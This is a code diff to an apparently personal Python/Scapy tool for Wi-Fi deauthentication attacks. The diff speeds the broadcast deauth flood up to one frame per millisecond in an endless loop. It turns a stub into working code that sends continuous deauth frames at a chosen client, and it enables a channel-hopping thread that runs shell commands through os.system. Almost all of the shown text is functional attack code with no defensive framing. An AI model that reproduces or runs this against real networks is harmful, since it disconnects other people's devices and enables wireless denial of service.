@@ -9,17 +9,18 @@ import time
 def Ap_Broadcast(argu):
     dot11 = Dot11(type=0, subtype=12, addr1="ff:ff:ff:ff:ff:ff",addr2=argu[1], addr3=argu[1])
     frame = RadioTap()/dot11/Dot11Deauth(reason=7)
-    sendp(frame, iface=argu[0], inter=0.01, loop=1)
+    sendp(frame, iface=argu[0], inter=0.001, loop=1)
 
 def Ap_Unicast(argu):
-    print(argu)
-    return 0
+    dot11 = Dot11(type=0, subtype=12, addr1=argu[2],addr2=argu[1], addr3=argu[1])
+    frame = RadioTap()/dot11/Dot11Deauth(reason=7)
+    sendp(frame, iface=argu[0], inter=0.001, loop=1)
 
 def Auth_Attack(argu):
     print(argu)
     return 0
 
-'''
+
 def Hopping(args):
     ch = 0
     while(1):
@@ -28,7 +29,7 @@ def Hopping(args):
         os.system(x)
         print(x)
         time.sleep(0.1)
-'''
+
 
 if __name__ == '__main__':
 
@@ -38,7 +39,7 @@ if __name__ == '__main__':
 
     argu_len = len(argu)
     
-    #threading.Thread(target=Hopping, args=(argu,)).start()
+    threading.Thread(target=Hopping, args=(argu,)).start()
     
     if argu_len == 2:
         Ap_Broadcast(argu)
